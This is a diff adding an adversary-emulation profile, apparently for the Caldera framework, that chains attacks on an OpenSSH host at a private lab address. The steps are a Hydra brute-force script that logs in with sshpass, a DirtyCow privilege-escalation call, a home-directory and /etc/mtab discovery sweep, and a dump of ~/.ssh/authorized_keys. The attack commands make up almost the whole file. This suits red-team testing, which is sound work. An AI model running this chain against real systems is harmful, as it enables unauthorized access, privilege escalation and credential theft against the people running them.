@@ -1,0 +1,87 @@
+id: 2ff6ee3b-f111-4233-8a36-95ad21c6ed3e
+name: SSH Compromiser 2
+description: Profile focused on attacking OpenSSH service.
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- fdb953e9-a9dd-4cb9-890f-95921298b574
+- 9ff18455-a1ff-453c-bb6c-427afdafc87f
+- bd129a1095db2189a251359d5dac6553
+- d9775874-3a01-438d-a340-aa96bd9ac7dc
+abilities:
+ fdb953e9-a9dd-4cb9-890f-95921298b574:
+  name:  Brute Force SSH and Login 2
+  tactic:  credential-access
+  technique_name:  "Account Discovery"
+  technique_id:  T1110.001
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       IP="192.168.56.110";
+       PORT="22";
+       USERLIST="/home/tada/Downloads/user.txt";
+       PASSLIST="/home/tada/Downloads/pass.txt";
+       RESULTFILE="/home/tada/Downloads/ssh_crack.txt";
+       
+       echo "[*] Starting Hydra brute-force, server= $IP";
+       rm -rf $RESULTFILE;
+       hydra -L "$USERLIST" -P "$PASSLIST" ssh://$IP -t 4 -o "$RESULTFILE";
+       
+       if grep -q "login:" "$RESULTFILE"; then
+           echo "[*] Credentials found!";    
+           username=$(grep "login:" "$RESULTFILE" | awk '{print $5}');
+           password=$(grep "login:" "$RESULTFILE" | awk '{print $7}');
+           echo "[*] Using credentials: $username : $password";
+           sshpass -p "$password" ssh -o StrictHostKeyChecking=no -p $PORT $username@$IP;
+           if [[ $? -ne 0 ]]; then
+               exit 1;
+           fi;
+           echo "[*] Logged in as user: $username";
+           exit;
+       else
+           echo "[!] No valid credentials found by Hydra.";
+           exit 1;
+       fi
+       
+ 9ff18455-a1ff-453c-bb6c-427afdafc87f:
+  name:  Using DirtyCow to gain privilege (Require dirtycow) 2
+  tactic:  privilege-escalation
+  technique_name:  "Exploitation for Privilege Escalation"
+  technique_id:  T1068
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       
+       echo "user_first : $(whoami) #{ host.user.name }"
+       nohup ./dev/null/dirtycow 1>/dev/null 2>/dev/null;
+       echo "user_become: $(whoami)"
+       
+       
+       
+ bd129a1095db2189a251359d5dac6553:
+  name:  Nix File and Directory Discovery 2/2
+  tactic:  discovery
+  technique_name:  "File and Directory Discovery"
+  technique_id:  T1083
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       echo " #{ host.user.name }";
+       cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name ".*"
+ d9775874-3a01-438d-a340-aa96bd9ac7dc:
+  name:  Extract SSH Keys 2
+  tactic:  credential-access
+  technique_name:  "Credential Dumping"
+  technique_id:  T1003
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       echo " #{ host.user.name }";
+       if [ -f ~/.ssh/authorized_keys ]; then
+           cp ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak;
+           ssh_authorized_keys=$(cat ~/.ssh/authorized_keys);
+           echo "$ssh_authorized_keys";
+       fi
